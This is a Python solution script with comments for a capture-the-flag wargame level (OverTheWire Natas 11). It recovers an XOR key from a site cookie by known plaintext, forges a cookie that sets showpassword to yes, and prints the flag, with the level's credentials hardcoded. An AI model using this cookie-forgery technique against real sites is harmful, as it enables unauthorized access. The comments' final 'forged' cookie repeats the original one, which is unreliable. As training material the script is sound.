#! /usr/bin/python


import requests
import base64
from urllib.parse import unquote

#Functions
def cleanheaders(headers):
	global cookie
	cookie=(f"{headers.get('Set-Cookie','Not found')}")	
	for item in headers:
		value=headers.get(item,'Not Found')
		# print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers=''


#Payload
payload=''
url=host+path

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
cleanheaders(headers)


cookie=cookie.split('=')[-1]
print(f'ORIGINAL COOKIE  : {cookie}')
cookie=(unquote(cookie))
print(f'COOKIE AFTER URL DECODE : {cookie}')

# This is the cyphertext of the xorencryption
cipher=base64.b64decode(cookie).decode()
print(f'COOKIE AFTER BASE64 DECODE : {cipher}\n\n\n')

# Predicted original string of the encryption
originalstring='{"showpassword":"no","bgcolor":"#ffffff"}'

#Encrypting in xor(we will use this later to change contents of the encrypted cookie)
def encrypt(string,key):
	result=''
	for index in range(len(string)):
		result+=chr(ord(string[index])^ord(key[index%len(key)]))
	return result

#Finding the key
# In xor, cipherstring ^ originalstring = key
def findkey(cipher,string):
	final=encrypt(cipher,string)
	return final



key=findkey(cipher,originalstring)

#Removing duplicates
result=''
for letter in key:
	if letter not in result:
		result+=letter
	else:
		pass
key=result
print(f'ENCRYPTION KEY IS  : {key}\n')

#Encrypting a payload with the key we obtained
payload='{"showpassword":"yes","bgcolor":"#00ff00"}'
encrypted=(encrypt(payload,key))
encrypted=base64.b64encode(encrypted.encode()).decode()
print(f'ENCRYPTED PAYLOAD : {payload} \nTO CIPHER : {encrypted}\n')


response=requests.get(url,auth=(basic_username,basic_password),headers={"Cookie":f"data={encrypted}"})
content=response.text
status=response.status_code
headers=response.headers






# cleanheaders(headers)
flag=content.split('\n')[16]
print(flag)


#WRITEUP
#Checking the cookies we find ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
# That %3D at the end seems to be url encoded ,so we url decode it with unquote
# After that we get ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
# The = at the end tells me this is a base64 string,so we decode it
# Decoding the strings gives us some cipher text UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
# Since have the source code,we can work in reverse so as to find the key
# In them loadData function,so as to read contents of the cookie,the cookie is first base64 decoded,then xordecrypted (with a key) and finally json_decoded
# json_decode converts a json string to an array hence After json_decoding the result is supposed to be an array
# This means that ,after base64 decoding the string and xordecrypting the cookie,the result is a json string which is later converted to an array
# This is great since we can figure out the contents of the json string from the source code
# The default data of the cookie is array( "showpassword"=>"no", "bgcolor"=>"#ffffff") 
# Converting it to json gives {"showpassword":"no","bgcolor":"#ffffff"} as the result
# This means that when we xordecrypt the cipher string with the unknown key ,we get {"showpassword":"no","bgcolor":"#ffffff"}(originalstring) as the result
# If we find the key,we can change the contents of the cookie to what we want and then encrypt it with the key to make it valid
# In xor, cipherstring ^ originalstring = key
# Since we have the cipherstring and the originalstring,we can find the key
# We find the key is qw8J
# Now we change showpassword from no to yes i.e {"showpassword":"yes","bgcolor":"#ffffff"} and the we encrypt with the key we obtained
# Convert to base64 to get ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw= and set that as the cookie so as to get the flag
